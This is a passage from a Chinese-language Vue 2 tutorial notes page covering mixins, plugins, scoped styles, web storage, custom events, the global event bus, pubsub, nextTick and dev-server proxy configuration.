</code></pre></div><p>第二步使用混入：</p> <p>全局混入：<code>Vue.mixin(xxx)</code></p> <p>局部混入：<code>mixins:['xxx']</code></p> <p>示例</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">import</span> hunhe <span class="token keyword">from</span> <span class="token string">'../mixin'</span>
<span class="token comment">//全局混入</span>
Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span>hunhe<span class="token punctuation">)</span>
<span class="token comment">//局部混入</span>
mixins<span class="token operator">:</span><span class="token punctuation">[</span>hunhe<span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre></div><h3 id="_5-插件"><a href="#_5-插件" class="header-anchor">#</a> 5，插件</h3> <ol><li><p>功能：用于增强Vue</p></li> <li><p>本质：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。</p></li> <li><p>定义插件：</p></li></ol> <div class="language-js extra-class"><pre class="language-js"><code>对象<span class="token punctuation">.</span><span class="token function-variable function">install</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">Vue<span class="token punctuation">,</span> options</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 1. 添加全局过滤器</span>
        Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    
        <span class="token comment">// 2. 添加全局指令</span>
        Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    
        <span class="token comment">// 3. 配置全局混入(合)</span>
        Vue<span class="token punctuation">.</span><span class="token function">mixin</span><span class="token punctuation">(</span><span class="token operator">...</span><span class="token punctuation">.</span><span class="token punctuation">)</span>
    
        <span class="token comment">// 4. 添加实例方法</span>
        <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">$myMethod</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token operator">...</span><span class="token punctuation">}</span>
        <span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$myProperty <span class="token operator">=</span> xxxx
<span class="token punctuation">}</span>
</code></pre></div><ol start="4"><li>使用插件：Vue.use(Vue, options)</li></ol> <h3 id="_6-scoped样式"><a href="#_6-scoped样式" class="header-anchor">#</a> 6，scoped样式</h3> <ol><li><p>作用：让样式在局部生效，防止冲突。</p></li> <li><p>写法：<code>&lt;style scoped&gt;</code></p></li></ol> <h3 id="_7-本地存储"><a href="#_7-本地存储" class="header-anchor">#</a> 7，本地存储</h3> <p>webStorage</p> <ol><li><p>存储内容大小一般支持5MB左右（不同浏览器可能还不一样）</p></li> <li><p>浏览器端通过 Window.sessionStorage 和 Window.localStorage 属性来实现本地存储机制。</p></li> <li><p>相关API：</p> <ol><li><p><code>xxxxxStorage.setItem('key', 'value');</code>
该方法接受一个键和值作为参数，会把键值对添加到存储中，如果键名存在，则更新其对应的值。</p></li> <li><p><code>xxxxxStorage.getItem('person');</code></p> <p>​		该方法接受一个键名作为参数，返回键名对应的值。</p></li> <li><p><code>xxxxxStorage.removeItem('key');</code></p> <p>​		该方法接受一个键名作为参数，并把该键名从存储中删除。</p></li> <li><p><code>xxxxxStorage.clear()</code></p> <p>​		该方法会清空存储中的所有数据。</p></li></ol></li> <li><p><strong>备注</strong>：</p> <ol><li>SessionStorage存储的内容会随着浏览器窗口关闭而消失。</li> <li>LocalStorage存储的内容，需要手动清除才会消失。</li> <li><code>xxxxxStorage.getItem(xxx)</code>如果xxx对应的value获取不到，那么getItem的返回值是null。</li> <li><code>JSON.parse(null)</code>的结果依然是null。</li></ol></li></ol> <p>注意点</p> <p>普通类型基本都是存的字符串，如果想存对象可以采用json的格式转换</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">let</span> p <span class="token operator">=</span> <span class="token punctuation">{</span>name<span class="token operator">:</span><span class="token string">'张三'</span><span class="token punctuation">,</span>age<span class="token operator">:</span><span class="token number">18</span><span class="token punctuation">}</span>
<span class="token comment">//存</span>
localStorage<span class="token punctuation">.</span><span class="token function">setItem</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">,</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">//取</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'person'</span><span class="token punctuation">)</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><h3 id="_8-组件的自定义事件"><a href="#_8-组件的自定义事件" class="header-anchor">#</a> 8，组件的自定义事件</h3> <ol><li><p>一种组件间通信的方式，适用于：<strong style="color:red;">子组件 ===&gt; 父组件</strong></p></li> <li><p>使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（<span style="color:red;">事件的回调在A中</span>）</p></li> <li><p>绑定自定义事件：</p> <ol><li><p>第一种方式，在父组件中：<code>&lt;Demo @atguigu=&quot;test&quot;/&gt;</code>  或 <code>&lt;Demo v-on:atguigu=&quot;test&quot;/&gt;</code></p></li> <li><p>第二种方式，在父组件中：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token operator">&lt;</span>Demo ref<span class="token operator">=</span><span class="token string">&quot;demo&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
   <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>xxx<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'atguigu'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>test<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><p>若想让自定义事件只能触发一次，可以使用<code>once</code>修饰符，或<code>$once</code>方法。</p></li></ol></li> <li><p>触发自定义事件：在子组件中：<code>this.$emit('atguigu',数据)</code></p></li> <li><p>解绑自定义事件：在子组件中：<code>this.$off('atguigu')</code></p></li> <li><p>组件上也可以绑定原生DOM事件，需要使用<code>native</code>修饰符。</p></li> <li><p>注意：通过<code>this.$refs.xxx.$on('atguigu',回调)</code>绑定自定义事件时，回调<span style="color:red;">要么配置在methods中</span>，<span style="color:red;">要么用箭头函数</span>，否则this指向会出问题！</p> <p><strong>总结</strong></p> <p>子组件修改父组件数据的两种方式</p> <p>1，使用props，父组件传入一个方法给子组件调用</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token operator">&lt;</span>School <span class="token operator">:</span>getSchoolName<span class="token operator">=</span><span class="token string">&quot;getSchoolName&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre></div><p>2，使用自定义事件让子组件触发使用</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token operator">&lt;</span>Demo @atguigu<span class="token operator">=</span><span class="token string">&quot;test&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>  或  <span class="token operator">&lt;</span>Demo v<span class="token operator">-</span>on<span class="token operator">:</span>atguigu<span class="token operator">=</span><span class="token string">&quot;test&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>
<span class="token comment">//触发</span>
<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'atguigu'</span><span class="token punctuation">,</span>数据<span class="token punctuation">)</span>

<span class="token comment">//如果想使用原生的事件需要添加native</span>
<span class="token operator">&lt;</span>Student @click<span class="token punctuation">.</span>native<span class="token operator">=</span><span class="token string">&quot;show&quot;</span><span class="token operator">/</span><span class="token operator">&gt;</span>
</code></pre></div></li></ol> <h3 id="_9-全局事件总线"><a href="#_9-全局事件总线" class="header-anchor">#</a> 9，全局事件总线</h3> <p>英文名：GlobalEventBus</p> <ol><li><p>一种组件间通信的方式，适用于<span style="color:red;">任意组件间通信</span>。</p></li> <li><p>安装全局事件总线：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token comment">//main.js中</span>
<span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
	<span class="token operator">...</span><span class="token operator">...</span>
	<span class="token function">beforeCreate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token class-name">Vue</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$bus <span class="token operator">=</span> <span class="token keyword">this</span> <span class="token comment">//安装全局事件总线，$bus就是当前应用的vm</span>
	<span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token operator">...</span><span class="token operator">...</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span> 
</code></pre></div></li> <li><p>使用事件总线：</p> <ol><li><p>接收数据：A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的<span style="color:red;">回调留在A组件自身。</span></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>$bus<span class="token punctuation">.</span><span class="token function">$on</span><span class="token punctuation">(</span><span class="token string">'xxxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><p>提供数据：<code>this.$bus.$emit('xxxx',数据)</code></p></li></ol></li> <li><p>最好在beforeDestroy钩子中，用$off去解绑<span style="color:red;">当前组件所用到的</span>事件。</p></li></ol> <h3 id="_10-消息订阅与发布"><a href="#_10-消息订阅与发布" class="header-anchor">#</a> 10，消息订阅与发布</h3> <p>英文名：pubsub，外部插件，与全局事件总线功能一致，一般推荐使用Vue自带的全局事件总线。</p> <ol><li><p>一种组件间通信的方式，适用于<span style="color:red;">任意组件间通信</span>。</p></li> <li><p>使用步骤：</p> <ol><li><p>安装pubsub：<code>npm i pubsub-js</code></p></li> <li><p>引入: <code>import pubsub from 'pubsub-js'</code></p></li> <li><p>接收数据：A组件想接收数据，则在A组件中订阅消息，订阅的<span style="color:red;">回调留在A组件自身。</span></p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token function">methods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
  <span class="token comment">//回调函数默认两个形参，第一个为消息名，一般不使用，可使用下划线占位</span>
  <span class="token function">demo</span><span class="token punctuation">(</span><span class="token parameter">_<span class="token punctuation">,</span>data</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">...</span><span class="token operator">...</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token operator">...</span><span class="token operator">...</span>
<span class="token function">mounted</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">this</span><span class="token punctuation">.</span>pid <span class="token operator">=</span> pubsub<span class="token punctuation">.</span><span class="token function">subscribe</span><span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token keyword">this</span><span class="token punctuation">.</span>demo<span class="token punctuation">)</span> <span class="token comment">//订阅消息</span>
<span class="token punctuation">}</span>
</code></pre></div></li> <li><p>提供数据：<code>pubsub.publish('xxx',数据)</code></p></li> <li><p>最好在beforeDestroy钩子中，用<code>PubSub.unsubscribe(pid)</code>去<span style="color:red;">取消订阅。</span>与定时器一样，需要通过id来取消订阅。</p></li></ol></li></ol> <h3 id="_11-nexttick"><a href="#_11-nexttick" class="header-anchor">#</a> 11，nextTick</h3> <ol><li><p>语法：<code>this.$nextTick(回调函数)</code></p></li> <li><p>作用：在下一次 DOM 更新结束后执行其指定的回调。</p></li> <li><p>什么时候用：当改变数据后，要基于更新后的新DOM进行某些操作时，要在nextTick所指定的回调函数中执行。</p> <p>示例</p> <p>可以用来输入框进行显示后获取焦点，因为正常写获取焦点会在模板解析前执行导致导致获取焦点失效。使用这种方式可以在模板重新解析后再执行回调函数。</p> <div class="language-js extra-class"><pre class="language-js"><code> <span class="token comment">//下一轮获取焦点</span>
<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$nextTick</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>inputTitle<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>

<span class="token comment">//也可以使用无时间定时器</span>
<span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>inputTitle<span class="token punctuation">.</span><span class="token function">focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre></div></li></ol> <h3 id="_12-vue脚手架配置代理"><a href="#_12-vue脚手架配置代理" class="header-anchor">#</a> 12，vue脚手架配置代理</h3> <p><strong>目的：Vue解决跨域问题的方式</strong></p> <p>原理：启动一个代理服务器来转发请求，服务器之间没有跨域问题。</p> <p><strong>方法一</strong></p> <p>​	在vue.config.js中添加如下配置：</p> <div class="language-js extra-class"><pre class="language-js"><code>devServer<span class="token operator">:</span><span class="token punctuation">{</span>
  proxy<span class="token operator">:</span><span class="token string">&quot;http://localhost:5000&quot;</span>
<span class="token punctuation">}</span>
</code></pre></div><p>说明：</p> <ol><li>优点：配置简单，请求资源时直接发给前端（8080）即可。</li> <li>缺点：不能配置多个代理，不能灵活的控制请求是否走代理。</li> <li>工作方式：若按照上述配置代理，当请求了前端不存在的资源时，那么该请求会转发给服务器 （优先匹配前端资源）</li></ol> <p><strong>方法二</strong></p> <p>编写vue.config.js配置具体代理规则：</p> <div class="language-js extra-class"><pre class="language-js"><code>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>
	devServer<span class="token operator">:</span> <span class="token punctuation">{</span>
      proxy<span class="token operator">:</span> <span class="token punctuation">{</span>
      <span class="token string">'/api1'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 匹配所有以 '/api1'开头的请求路径</span>
        target<span class="token operator">:</span> <span class="token string">'http://localhost:5000'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        pathRewrite<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">'^/api1'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>  <span class="token comment">//将请求url中的api1替换为''，即去掉</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      <span class="token string">'/api2'</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token comment">// 匹配所有以 '/api2'开头的请求路径</span>
        target<span class="token operator">:</span> <span class="token string">'http://localhost:5001'</span><span class="token punctuation">,</span><span class="token comment">// 代理目标的基础路径</span>
        changeOrigin<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>
        pathRewrite<span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string">'^/api2'</span><span class="token operator">:</span> <span class="token string">''</span><span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment">/*
   changeOrigin设置为true时，服务器收到的请求头中的host为：localhost:5000
   changeOrigin设置为false时，服务器收到的请求头中的host为：localhost:8080
   changeOrigin默认值为true
*/</span>
</code></pre></div><p>说明：</p> <ol><li>优点：可以配置多个代理，且可以灵活的控制请求是否走代理。</li> <li>缺点：配置略微繁琐，请求资源时必须加前缀。</li></ol></div> <footer class="page-edit"><div class="edit-link"><a href="https://github.com/vuejs/vuepress/edit/master/docs/mybefore/myVue/Vue2/Vue2.md" target="_blank" rel="noopener noreferrer">帮助我们改善此页面！</a> <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></div> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/dose1/assets/js/app.370f2ecb.js" defer></script><script src="/dose1/assets/js/2.579f079f.js" defer></script><script src="/dose1/assets/js/17.54584c3d.js" defer></script>
  </body>
</html>
